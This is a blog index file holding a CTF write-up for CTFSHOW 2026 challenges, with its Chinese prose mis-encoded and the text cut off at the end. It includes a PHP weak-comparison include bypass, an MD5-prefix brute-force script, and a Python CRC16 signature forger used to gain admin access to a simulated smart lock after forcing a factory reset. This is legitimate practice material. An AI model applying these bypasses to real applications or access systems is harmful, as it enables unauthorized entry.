<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CTFSHOW-2026å…ƒæ—¦è·¨å¹´æ¬¢ä¹èµ›</title>
    <link href="/2026/01/08/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/"/>
    <url>/2026/01/08/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="happy2026"><a href="#happy2026" class="headerlink" title="happy2026"></a>happy2026</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><br><span class="hljs-variable">$happy</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;happy&#x27;</span>];<br><span class="hljs-variable">$new</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new&#x27;</span>];<br><span class="hljs-variable">$year</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;year&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$year</span>==<span class="hljs-number">2026</span> &amp;&amp; <span class="hljs-variable">$year</span>!==<span class="hljs-number">2026</span> &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$year</span>))&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$happy</span>[<span class="hljs-variable">$new</span>[<span class="hljs-variable">$year</span>]];<br>&#125;<br><br></code></pre></td></tr></table></figure><p>åˆ©ç”¨phpå¼±ç±»å‹å’Œæ•°ç»„åµŒå¥—</p><p><img src="https://pic1.imgdb.cn/item/695f66f4f6739df2e0ce1e03.png"></p><h2 id="SafePassword"><a href="#SafePassword" class="headerlink" title="SafePassword"></a>SafePassword</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$expected</span> = getExpectedHash(<span class="hljs-variable">$channelKey</span>);<br>md5(<span class="hljs-variable">$accessKey</span>) == <span class="hljs-variable">$expected</span> <span class="hljs-regexp">//</span>æ ¡éªŒæœºåˆ¶<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆ$expectedæ˜¯å¦å¯æ§ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildExpectedHash</span>(<span class="hljs-params"><span class="hljs-variable">$channelKey</span></span>): <span class="hljs-title">string</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00-\x08\x0B\x0C\x0E-\x1F]/&#x27;</span>, <span class="hljs-variable">$channelKey</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$channelKey</span>) &lt; <span class="hljs-number">64</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;ctfshow:&#x27;</span> . <span class="hljs-variable">$channelKey</span> . <span class="hljs-string">&#x27;:verify&#x27;</span> . <span class="hljs-variable">$secret_salt</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;&#x27;</span>, LENGTH_ERROR);<br>        &#125;<br>    &#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span>)&#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;&#x27;</span>, VERIFY_FAILED);<br>    &#125;<br>       <br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pickErrorCode</span>(<span class="hljs-params"><span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span></span>): <span class="hljs-title">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$code</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getCode</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">inErrorCodes</span>(<span class="hljs-variable">$code</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$code</span>;<br>    &#125;<br>    <span class="hljs-variable">$idx</span> = <span class="hljs-title function_ invoke__">abs</span>((<span class="hljs-keyword">int</span>)<span class="hljs-title function_ invoke__">crc32</span>(<span class="hljs-title function_ invoke__">get_class</span>(<span class="hljs-variable">$e</span>) . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>())) % <span class="hljs-title function_ invoke__">count</span>(ERROR_CODES);<br>    <span class="hljs-keyword">return</span> ERROR_CODES[<span class="hljs-variable">$idx</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpectedHash</span>(<span class="hljs-params"><span class="hljs-variable">$channelKey</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">buildExpectedHash</span>(<span class="hljs-variable">$channelKey</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">pickErrorCode</span>(<span class="hljs-variable">$e</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡ä¼ å…¥channelKeyå¯ä»¥è§¦å‘å¼‚å¸¸æŠ›å‡ºï¼Œä½¿$expected&#x3D;2025</p><p>æ ¡éªŒè¿›è¡Œå¼±æ¯”è¾ƒï¼Œæ„é€ ä¸€ä¸ª$accessKey md5åæ˜¯2025+å­—æ¯çš„å³å¯</p><p>ç®€å•çˆ†ç ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// ç›®æ ‡ï¼šmd5(accessKey) å‰4ä½ = 2025</span><br><span class="hljs-variable">$targetPrefix</span> = <span class="hljs-string">&quot;2025&quot;</span>;<br><span class="hljs-variable">$accessKey</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$found</span> = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">// ä»0å¼€å§‹æšä¸¾ï¼Œç›´åˆ°æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„å­—ç¬¦ä¸²</span><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">1000000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$testKey</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$i</span>;<br>    <span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$testKey</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$hash</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>) === <span class="hljs-variable">$targetPrefix</span>) &#123;<br>        <span class="hljs-variable">$accessKey</span> = <span class="hljs-variable">$testKey</span>;<br>        <span class="hljs-variable">$found</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$found</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„accessKeyï¼š<span class="hljs-subst">&#123;$accessKey&#125;</span>\n&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å…¶MD5å€¼ï¼š&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$accessKey</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æœªæ‰¾åˆ°ï¼ˆå¯æ‰©å¤§æšä¸¾èŒƒå›´ï¼‰\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°äº†434048</p><p>ä¸è¿‡è¿™ä¸ªçˆ†ç ´åªæ‰¾äº†æ•°å­—çš„ï¼Œå±€é™æ€§æ¯”è¾ƒå¤§ï¼Œwpé‡Œé¢çš„æ›´å…¨é¢ä¸€äº›</p><p><img src="https://pic1.imgdb.cn/item/695fb0c83379dd736939a923.png"></p><h3 id="è¡¥å……â€”â€”PHPå¼‚å¸¸æŠ›å‡º"><a href="#è¡¥å……â€”â€”PHPå¼‚å¸¸æŠ›å‡º" class="headerlink" title="è¡¥å……â€”â€”PHPå¼‚å¸¸æŠ›å‡º"></a>è¡¥å……â€”â€”PHPå¼‚å¸¸æŠ›å‡º</h3><p><a href="https://www.runoob.com/php/php-exception.html">PHPå¼‚å¸¸å¤„ç†</a></p><p>Throwableå¯¹è±¡$eçš„ç”¨æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// å¯èƒ½å‡ºé”™çš„ä»£ç </span><br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&quot;è¿æ¥å¤±è´¥&quot;</span>, <span class="hljs-number">1001</span>);<br>&#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span>) &#123;<br>    <span class="hljs-comment">// å¸¸è§ç”¨æ³•ï¼š</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;é”™è¯¯æ¶ˆæ¯: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();       <span class="hljs-comment">// &quot;è¿æ¥å¤±è´¥&quot;</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;é”™è¯¯ç : &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getCode</span>();            <span class="hljs-comment">// 1001</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ–‡ä»¶: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getFile</span>();              <span class="hljs-comment">// /path/to/file.php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è¡Œå·: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getLine</span>();              <span class="hljs-comment">// æŠ›å‡ºå¼‚å¸¸çš„é‚£ä¸€è¡Œ</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å †æ ˆ:\n&quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getTraceAsString</span>();   <span class="hljs-comment">// å®Œæ•´è°ƒç”¨æ ˆ</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SafeLock"><a href="#SafeLock" class="headerlink" title="SafeLock"></a>SafeLock</h2><p>æœ‰ç‚¹éš¾ï¼Œæˆ‘çœ‹äº†wpï¼Œåªèƒ½ç®€å•å†™ä¸€ä¸‹æ€è·¯ï¼Œå…¨è‡ªåŠ¨çš„pythonè„šæœ¬ç›®å‰æˆ‘è¿˜å†™ä¸å‡ºæ¥:(</p><p><img src="https://pic1.imgdb.cn/item/6960bf8914866864fecc477b.png"></p><p>é¦–å…ˆè§‚å¯Ÿæ—¥å¿—</p><ul><li>BOOT é”è”ç½‘ä¸Šçº¿</li><li>å¼€å§‹åˆå§‹åŒ–</li><li>ä½¿ç”¨å‡ºå‚å¯†é’¥å’Œé»˜è®¤saltä¸º123456 è®¾ç½®ç®¡ç†å‘˜å¡</li><li>ä½¿ç”¨ä¸€æ¬¡åå°±è¿‡æœŸ</li><li>SALTæ›´æ–°ä¸ºéšæœº8ä½æ•°å­—</li></ul><p>ä¸»è¦æ”»å‡»çº¿è·¯</p><p>æ‹‰é—¸-&gt;è¿«ä½¿é”ç”¨ç”µæ± -&gt;æ¯æ¬¡éªŒè¯æ‰5%çš„ç”µ-&gt;ç”µæ± æ‰å…‰ç”µ-&gt;é”å®Œå…¨è¿›å…¥ç¦»çº¿çŠ¶æ€-&gt;æ¢å¤ä¾›ç”µ-&gt;å¼€å§‹åˆå§‹åŒ–saltä¸º123456-&gt;ç»™è‡ªå·±åˆ·ç®¡ç†å‘˜å¡-&gt;å¼€é—¨ç¦ç³»ç»Ÿ</p><p>ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>å›å®¿èˆçš„æ—¶å€™æˆ‘çªç„¶æƒ³åˆ°ï¼Œè™½ç„¶å…¨è‡ªåŠ¨çš„æˆ‘ä¸ä¼šå†™ï¼Œä½†å¯ä»¥ç»“åˆæ‰‹åŠ¨å•Šï¼</p><p>å…ˆè®¿é—®&#x2F;api&#x2F;challengeè·å–nonce</p><p>å»&#x2F;api&#x2F;powerå…³ç”µæº</p><p><img src="https://pic1.imgdb.cn/item/6960ee3914866864fecd0bcd.png"></p><p>å»&#x2F;api&#x2F;verifyè¯·æ±‚20æ¬¡ç”¨å®Œç”µé‡</p><p><img src="https://pic1.imgdb.cn/item/6960ee9814866864fecd0bf6.png"></p><p>å†æ‰“å¼€ç”µæºæˆåŠŸè¿›å…¥å·¥å‚æ¨¡å¼</p><p>è·å–æ–°çš„nonceï¼Œå†™ä¸€ä¸ªå°è„šæœ¬è®¡ç®—CRC16ç­¾å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> annotations<br><br>DEVICE_ID = <span class="hljs-string">&quot;LOCK-X36D&quot;</span><br>FACTORY_SALT = <span class="hljs-string">&quot;123456&quot;</span><br>ROLE = <span class="hljs-string">&quot;admin&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crc16_ccitt_false</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    crc = <span class="hljs-number">0xFFFF</span><br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> data:<br>        crc ^= (b &lt;&lt; <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            <span class="hljs-keyword">if</span> crc &amp; <span class="hljs-number">0x8000</span>:<br>                crc = ((crc &lt;&lt; <span class="hljs-number">1</span>) ^ <span class="hljs-number">0x1021</span>) &amp; <span class="hljs-number">0xFFFF</span><br>            <span class="hljs-keyword">else</span>:<br>                crc = (crc &lt;&lt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFFF</span><br>    <span class="hljs-keyword">return</span> crc &amp; <span class="hljs-number">0xFFFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_sig</span>(<span class="hljs-params">device_id: <span class="hljs-built_in">str</span>, nonce: <span class="hljs-built_in">str</span>, salt: <span class="hljs-built_in">str</span>, role: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    msg = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;device_id&#125;</span>|<span class="hljs-subst">&#123;nonce&#125;</span>|<span class="hljs-subst">&#123;salt&#125;</span>|<span class="hljs-subst">&#123;role&#125;</span>&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;crc16_ccitt_false(msg):04X&#125;</span>&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    nonce=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;nonce:&quot;</span>)<br>    sig = calc_sig(DEVICE_ID, nonce, FACTORY_SALT, ROLE)<br>    <span class="hljs-built_in">print</span>(sig)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">raise</span> SystemExit(main())<br></code></pre></td></tr></table></figure><p>éªŒè¯ç­¾åï¼ŒæˆåŠŸï¼ï¼ï¼</p><p><img src="https://pic1.imgdb.cn/item/6960eef814866864fecd0c1f.png"></p><h3 id="è¡¥å……â€”â€”å‰ç«¯æ“ä½œä¸ºä»€ä¹ˆä¸èƒ½å®ç°ï¼Ÿ"><a href="#è¡¥å……â€”â€”å‰ç«¯æ“ä½œä¸ºä»€ä¹ˆä¸èƒ½å®ç°ï¼Ÿ" class="headerlink" title="è¡¥å……â€”â€”å‰ç«¯æ“ä½œä¸ºä»€ä¹ˆä¸èƒ½å®ç°ï¼Ÿ"></a>è¡¥å……â€”â€”å‰ç«¯æ“ä½œä¸ºä»€ä¹ˆä¸èƒ½å®ç°ï¼Ÿ</h3><p>æˆ‘ä¸€å¼€å§‹æƒ³çš„æ˜¯ç›´æ¥åœ¨å‰ç«¯æ“ä½œï¼Œè¿™æ ·æ›´æ–¹ä¾¿ï¼Œä½†æ˜¯å‰ç«¯æ¯æ¬¡åˆ·å¡æ¶ˆè€—1%çš„ç”µé‡ï¼ˆä¸Šé¢å†™çš„æ¯æ¬¡æ¶ˆè€—5%ï¼‰,è€Œä¸”burpæ‹¦æˆªå‘ç°å…³é—­æ‰“å¼€ç”µæºå¹¶ä¸ä¼šå‘&#x2F;api&#x2F;powerå‘é€è¯·æ±‚ï¼Œæ ¡éªŒç­¾åçš„responseé‡Œç”µé‡ä¸€ç›´æ˜¯100%ï¼Œå½“ç„¶ä¹Ÿæ— æ³•è¿›å…¥å·¥å‚æ¨¡å¼</p><p><img src="https://pic1.imgdb.cn/item/6960efb914866864fecd0c54.png"></p><p>ç”¨aiåˆ†æäº†ä¸€ä¸‹é¡µé¢æºä»£ç </p><hr><h4 id="ğŸ”-è¯¦ç»†åˆ†æ"><a href="#ğŸ”-è¯¦ç»†åˆ†æ" class="headerlink" title="ğŸ” è¯¦ç»†åˆ†æ"></a>ğŸ” è¯¦ç»†åˆ†æ</h4><p>1ï¸âƒ£ <strong>ç”µé‡æ¶ˆè€—é€»è¾‘åœ¨å‰ç«¯è¢«ç¡¬ç¼–ç ä¸º 1%</strong></p><p>çœ‹è¿™æ®µå…³é”®ä»£ç ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">batteryDrainOnce</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> mode = <span class="hljs-title function_">getPowerMode</span>();<br>  <span class="hljs-keyword">if</span> (mode !== <span class="hljs-string">&quot;BATTERY&quot;</span>) <span class="hljs-keyword">return</span>;<br><br>  state.<span class="hljs-property">battery</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, state.<span class="hljs-property">battery</span> - <span class="hljs-number">1</span>); <span class="hljs-comment">// âš ï¸ è¿™é‡Œå›ºå®šå‡ 1ï¼</span><br>  <span class="hljs-title function_">logLine</span>(<span class="hljs-string">&quot;meta&quot;</span>, <span class="hljs-string">`BATTERY â†’ <span class="hljs-subst">$&#123;state.battery&#125;</span>%`</span>);<br><br>  <span class="hljs-keyword">if</span> (state.<span class="hljs-property">battery</span> &lt;= <span class="hljs-number">0</span>) &#123;<br>    state.<span class="hljs-property">powered</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-title function_">logLine</span>(<span class="hljs-string">&quot;bad&quot;</span>, <span class="hljs-string">&quot;BATTERY DEPLETED: device shutdown&quot;</span>);<br>    <span class="hljs-title function_">logLine</span>(<span class="hljs-string">&quot;warn&quot;</span>, <span class="hljs-string">&quot;HINT: restore mains power to reboot device&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>æ— è®ºåç«¯ API å®é™…æ‰£å¤šå°‘ï¼Œå‰ç«¯ UI æ¯æ¬¡åªæ¨¡æ‹Ÿ -1%</strong></li><li>è¿™ä¸ª <code>batteryDrainOnce()</code> æ˜¯åœ¨ <code>verifySwipe()</code> ä¸­è°ƒç”¨çš„ï¼š<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">verifySwipe</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// ...</span><br>  <span class="hljs-title function_">batteryDrainOnce</span>(); <span class="hljs-comment">// â† å‰ç«¯è‡ªå·±æ‰£ 1%</span><br>  <span class="hljs-comment">// ...</span><br>  <span class="hljs-comment">// ç„¶åå†å»è°ƒç”¨ /api/verify</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><blockquote><p>ğŸ“Œ æ‰€ä»¥å‰ç«¯æ˜¾ç¤ºçš„ç”µé‡å˜åŒ– <strong>å’Œåç«¯çœŸå®çŠ¶æ€æ— å…³</strong>ï¼å®ƒåªæ˜¯æœ¬åœ°æ¨¡æ‹Ÿã€‚</p></blockquote><hr><p>2ï¸âƒ£ <strong>æ¢å¤ä¾›ç”µæ—¶ï¼Œå‰ç«¯è‡ªåŠ¨å……æ»¡ç”µï¼Œä½†ä¸ä¼šè§¦å‘ FACTORY_RESET</strong></p><p>çœ‹æ–­ç”µ&#x2F;ä¸Šç”µé€»è¾‘ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setMains</span>(<span class="hljs-params">on</span>) &#123;<br>  <span class="hljs-keyword">const</span> prev = state.<span class="hljs-property">mains_on</span>;<br>  state.<span class="hljs-property">mains_on</span> = !!on;<br><br>  <span class="hljs-keyword">if</span> (!prev &amp;&amp; state.<span class="hljs-property">mains_on</span>) &#123;<br>    state.<span class="hljs-property">battery</span> = <span class="hljs-number">100</span>; <span class="hljs-comment">// âš ï¸ ç›´æ¥è®¾ä¸º 100%</span><br>    state.<span class="hljs-property">powered</span> = <span class="hljs-literal">true</span>;<br>    <span class="hljs-title function_">logLine</span>(<span class="hljs-string">&quot;meta&quot;</span>, <span class="hljs-string">&quot;POWER RESTORED (MAINS)&quot;</span>);<br>    <span class="hljs-title function_">logLine</span>(<span class="hljs-string">&quot;meta&quot;</span>, <span class="hljs-string">&quot;BATTERY CHARGED â†’ 100% (policy)&quot;</span>);<br>  &#125;<br>  <span class="hljs-comment">// ... å…¶ä»–é€»è¾‘</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>å‰ç«¯åœ¨æ¢å¤ä¸»ç”µæºæ—¶ï¼Œç›´æ¥æŠŠ <code>battery = 100</code></strong></li><li><strong>å®Œå…¨æ²¡æœ‰æ£€æŸ¥â€œæ˜¯å¦æ˜¯å› ä¸ºç”µé‡è€—å°½æ‰ç¦»çº¿â€</strong></li><li>å› æ­¤ <strong>æ°¸è¿œä¸ä¼šè§¦å‘ <code>FACTORY_RESET_OK</code> äº‹ä»¶</strong></li></ul><blockquote><p>ğŸ’¥ è€Œåç«¯çš„çœŸå®é€»è¾‘æ˜¯ï¼š</p><ul><li>åªæœ‰å½“è®¾å¤‡ <strong>å› ç”µæ± &#x3D;0 è€Œ powered&#x3D;false</strong>ï¼Œ</li><li>å†æ”¶åˆ° <code>mains_on=true</code>ï¼Œ</li><li>æ‰ä¼šè§¦å‘å·¥å‚é‡ç½®ï¼Œå¹¶é‡ç½® salt ä¸º <code>123456</code></li></ul></blockquote><p>ä½†å‰ç«¯å®Œå…¨å¿½ç•¥äº†è¿™ä¸ªæ¡ä»¶ï¼</p><hr><p>3ï¸âƒ£ <strong>å‰ç«¯è°ƒç”¨äº† <code>/api/verify</code>ï¼Œä½†æ²¡å¤„ç†å…³é”®å“åº”å­—æ®µ</strong></p><p>è™½ç„¶å‰ç«¯ç¡®å®å‘äº†è¯·æ±‚åˆ° <code>/api/verify</code>ï¼Œä½†å®ƒ<strong>åªå…³å¿ƒ <code>ok</code> å’Œ <code>flag</code></strong>ï¼Œå¿½ç•¥äº†ï¼š</p><ul><li><code>state.battery</code>ï¼ˆåç«¯çœŸå®ç”µé‡ï¼‰</li><li><code>state.powered</code></li><li><code>events</code>ï¼ˆæ¯”å¦‚ <code>[&quot;FACTORY_RESET_OK&quot;]</code>ï¼‰</li><li><code>rotate_nonce</code></li></ul><p>å‰ç«¯å§‹ç»ˆç”¨è‡ªå·±çš„ <code>state.battery</code> æ˜¾ç¤ºï¼Œè€Œä¸æ˜¯ç”¨ API è¿”å›çš„å€¼ï¼</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> r.<span class="hljs-title function_">json</span>();<br><span class="hljs-comment">// ... ä½†æ²¡æ›´æ–° state.battery = data.state?.battery</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å³ä½¿åç«¯å·²ç»æŠŠç”µé‡æ‰£åˆ° 0ï¼Œå‰ç«¯ UI ä»å¯èƒ½æ˜¾ç¤º 80%ï¼ˆå› ä¸ºå®ƒæ˜¯æŒ‰ 1% æ‰£çš„ï¼‰ã€‚</p><hr><p>4ï¸âƒ£ <strong>å‡ºé¢˜äººçš„æ„å›¾ï¼šå¼•å¯¼ä½ ç»•è¿‡å‰ç«¯</strong></p><p>å‰ç«¯æ—¥å¿—ä¸­å…¶å®æœ‰æç¤ºï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span 